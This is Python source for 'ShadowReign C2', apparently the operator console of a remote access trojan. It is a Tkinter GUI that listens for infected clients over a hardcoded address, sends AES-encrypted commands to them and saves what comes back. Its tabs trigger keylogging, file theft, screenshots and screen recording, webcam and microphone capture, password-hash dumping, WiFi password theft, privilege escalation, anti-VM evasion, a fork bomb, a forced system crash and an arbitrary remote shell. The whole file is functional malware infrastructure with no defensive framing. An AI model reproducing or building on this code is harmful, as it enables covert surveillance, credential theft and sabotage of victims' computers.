import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import json
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time
import psutil
from PIL import Image, ImageTk
import io

class ShadowReignGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("ShadowReign C2 - Boss Mode")
        self.root.geometry("1200x800")
        self.root.configure(bg="#1e1e1e")
        
        # C2 Config
        self.HOST = "192.168.1.133"
        self.PORT = 5251
        self.KEY = b"ShadowReignBoss!"
        self.clients = {}
        self.selected_client = None
        self.home_dir = os.path.expanduser("~")
        
        self.setup_ui()
        self.start_server()
        self.root.mainloop()

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background="#1e1e1e", borderwidth=0)
        style.configure("TNotebook.Tab", background="#2a2a2a", foreground="white", padding=[10, 5], font=("Arial", 12))
        style.map("TNotebook.Tab", background=[("selected", "#ff4444")])
        style.configure("Treeview", background="#333333", foreground="white", fieldbackground="#333333", font=("Arial", 10))
        style.configure("Treeview.Heading", background="#2a2a2a", foreground="white", font=("Arial", 11, "bold"))

        sidebar = tk.Frame(self.root, bg="#2a2a2a", width=300)
        sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
        
        tk.Label(sidebar, text="Connected Clients", bg="#2a2a2a", fg="white", font=("Arial", 14, "bold")).pack(pady=5)
        self.client_list = ttk.Treeview(sidebar, columns=("ID", "IP", "OS", "Status", "Anti-VM"), show="headings", height=10)
        self.client_list.heading("ID", text="ID")
        self.client_list.heading("IP", text="IP")
        self.client_list.heading("OS", text="OS")
        self.client_list.heading("Status", text="Status")
        self.client_list.heading("Anti-VM", text="Anti-VM")
        self.client_list.column("ID", width=50)
        self.client_list.column("IP", width=100)
        self.client_list.column("OS", width=80)
        self.client_list.column("Status", width=60)
        self.client_list.column("Anti-VM", width=60)
        self.client_list.pack(fill=tk.Y, pady=10)
        self.client_list.bind("<<TreeviewSelect>>", self.select_client)
        
        self.main_frame = tk.Frame(self.root, bg="#1e1e1e")
        self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tk.Label(self.main_frame, text="ShadowReign Control Center", bg="#1e1e1e", fg="white", font=("Arial", 16, "bold")).pack(pady=5)
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        self.tabs = {
            "Keylogger": self.create_keylogger_tab,
            "Files": self.create_files_tab,
            "Media": self.create_media_tab,
            "System": self.create_system_tab,
            "Pranks": self.create_pranks_tab,
            "Shell": self.create_shell_tab,
            "Live": self.create_live_tab,
        }
        for name, func in self.tabs.items():
            tab = tk.Frame(self.notebook, bg="#1e1e1e")
            self.notebook.add(tab, text=name)
            func(tab)

    def encrypt(self, data):
        cipher = AES.new(self.KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode()
        ct = base64.b64encode(ct_bytes).decode()
        return f"{iv}:{ct}"

    def decrypt(self, data):
        iv, ct = data.split(":")
        iv = base64.b64decode(iv)
        ct = base64.b64decode(ct)
        cipher = AES.new(self.KEY, AES.MODE_CBC, iv=iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode()

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.HOST, self.PORT))
        self.server.listen(50)
        threading.Thread(target=self.accept_clients, daemon=True).start()
        print(f"Server ruling at {self.HOST}:{self.PORT}, Boss.")

    def accept_clients(self):
        client_id = 0
        while True:
            try:
                client_socket, addr = self.server.accept()
                self.clients[client_id] = (client_socket, {"ip": addr[0], "os": "Unknown", "status": "Online", "anti_vm": False})
                threading.Thread(target=self.handle_client, args=(client_id,), daemon=True).start()
                client_id += 1
            except:
                break

    def handle_client(self, client_id):
        sock = self.clients[client_id][0]
        while True:
            try:
                data = sock.recv(8192).decode()
                if not data:
                    break
                response = json.loads(self.decrypt(data))
                self.clients[client_id][1].update(response)
                self.client_list.delete(*[i for i in self.client_list.get_children() if self.client_list.item(i)["values"][0] == client_id])
                self.client_list.insert("", "end", values=(client_id, 
                                                          self.clients[client_id][1]["ip"], 
                                                          self.clients[client_id][1]["os"], 
                                                          "Online", 
                                                          "On" if self.clients[client_id][1]["anti_vm"] else "Off"))
                if "keylogs" in response:
                    self.keylog_display.delete(1.0, tk.END)
                    self.keylog_display.insert(tk.END, response["keylogs"])
                    self.save_to_file("keylogs.txt", response["keylogs"])
                elif "output" in response:
                    self.shell_output.delete(1.0, tk.END)
                    self.shell_output.insert(tk.END, response["output"])
                    self.save_to_file("shell_output.txt", response["output"])
                elif "screenshot" in response:
                    self.display_image(response["screenshot"], "screenshot.png")
                elif "video" in response:
                    self.save_to_file("screen_recording.avi", base64.b64decode(response["video"]), binary=True)
                elif "webcam" in response:
                    self.display_image(response["webcam"], "webcam_snap.jpg")
                elif "file" in response:
                    self.save_to_file("downloaded_file", base64.b64decode(response["file"]), binary=True)
                elif "status" in response:
                    messagebox.showinfo("Status", response["status"])
            except:
                self.clients[client_id][1]["status"] = "Offline"
                self.client_list.delete(*[i for i in self.client_list.get_children() if self.client_list.item(i)["values"][0] == client_id])
                self.client_list.insert("", "end", values=(client_id, 
                                                          self.clients[client_id][1]["ip"], 
                                                          self.clients[client_id][1]["os"], 
                                                          "Offline", 
                                                          "On" if self.clients[client_id][1]["anti_vm"] else "Off"))
                break

    def save_to_file(self, filename, data, binary=False):
        filepath = os.path.join(self.home_dir, f"ShadowReign_{filename}")
        mode = "wb" if binary else "w"
        with open(filepath, mode) as f:
            f.write(data)
        print(f"Saved {filename} to {filepath}")

    def display_image(self, b64_data, filename):
        img_data = base64.b64decode(b64_data)
        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((400, 300))
        photo = ImageTk.PhotoImage(img)
        self.media_display.configure(image=photo)
        self.media_display.image = photo
        self.save_to_file(filename, img_data, binary=True)

    def select_client(self, event):
        selected = self.client_list.selection()
        if selected:
            self.selected_client = int(self.client_list.item(selected[0])["values"][0])

    def send_command(self, command, data=None):
        if self.selected_client is None:
            messagebox.showerror("Error", "Select a client first, Boss!")
            return
        sock = self.clients[self.selected_client][0]
        payload = self.encrypt(json.dumps({"command": command, "data": data}))
        try:
            sock.send(payload.encode())
        except:
            messagebox.showerror("Error", "Client disconnected, Boss!")

    # Tab Creators
    def create_keylogger_tab(self, tab):
        tk.Label(tab, text="Keylogger Controls", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Start Keylogger", command=lambda: self.send_command("keylogger_start"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Stop Keylogger", command=lambda: self.send_command("keylogger_stop"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Dump Logs", command=lambda: self.send_command("keylogger_dump"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        self.keylog_display = tk.Text(tab, height=15, width=80, bg="#333333", fg="white", font=("Arial", 10))
        self.keylog_display.pack(pady=10)

    def create_files_tab(self, tab):
        tk.Label(tab, text="File Management", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Browse Files", command=lambda: self.send_command("list_files"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Upload File", command=self.upload_file, bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Label(tab, text="Enter remote path to download:", bg="#1e1e1e", fg="white", font=("Arial", 10)).pack(pady=5)
        self.download_path = tk.Entry(tab, width=50, bg="#333333", fg="white", font=("Arial", 10))
        self.download_path.pack(pady=5)
        tk.Button(tab, text="Download File", command=lambda: self.send_command("download_file", self.download_path.get()), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)

    def upload_file(self):
        file_path = filedialog.askopenfilename(title="Select File to Upload")
        if file_path:
            self.send_command("upload_file", file_path)

    def create_media_tab(self, tab):
        tk.Label(tab, text="Media Capture", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Take Screenshot", command=lambda: self.send_command("screenshot"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Record Screen (10s)", command=lambda: self.send_command("record_screen"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Webcam Snap", command=lambda: self.send_command("webcam_snap"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        self.media_display = tk.Label(tab, bg="#333333")
        self.media_display.pack(pady=10)

    def create_system_tab(self, tab):
        tk.Label(tab, text="System Commands", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Dump Hashes", command=lambda: self.send_command("dump_hashes"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Steal WiFi Passwords", command=lambda: self.send_command("steal_wifi"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Elevate Privileges", command=lambda: self.send_command("elevate_privileges"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Toggle Anti-VM", command=self.toggle_anti_vm, bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)

    def toggle_anti_vm(self):
        if self.selected_client is not None:
            current_state = self.clients[self.selected_client][1]["anti_vm"]
            self.send_command("toggle_anti_vm", not current_state)

    def create_pranks_tab(self, tab):
        tk.Label(tab, text="Prank Controls", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Jumpscare", command=lambda: self.send_command("jumpscare"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Crash System", command=lambda: self.send_command("crash_system"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Fork Bomb", command=lambda: self.send_command("fork_bomb"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)

    def create_shell_tab(self, tab):
        tk.Label(tab, text="Shell Access", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        self.shell_input = tk.Entry(tab, width=50, bg="#333333", fg="white", font=("Arial", 10))
        self.shell_input.pack(pady=5)
        tk.Button(tab, text="Run Command", command=lambda: self.send_command("shell", self.shell_input.get()), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        self.shell_output = tk.Text(tab, height=15, width=80, bg="#333333", fg="white", font=("Arial", 10))
        self.shell_output.pack(pady=10)

    def create_live_tab(self, tab):
        tk.Label(tab, text="Live Streaming (Not Displayed)", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Button(tab, text="Stream Screen", command=lambda: self.send_command("stream_screen"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Stream Webcam", command=lambda: self.send_command("stream_webcam"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Button(tab, text="Stream Mic", command=lambda: self.send_command("stream_mic"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
        tk.Label(tab, text="Note: Streaming data is saved, not displayed live.", bg="#1e1e1e", fg="white", font=("Arial", 10, "italic")).pack(pady=5)

if __name__ == "__main__":
    ShadowReignGUI()
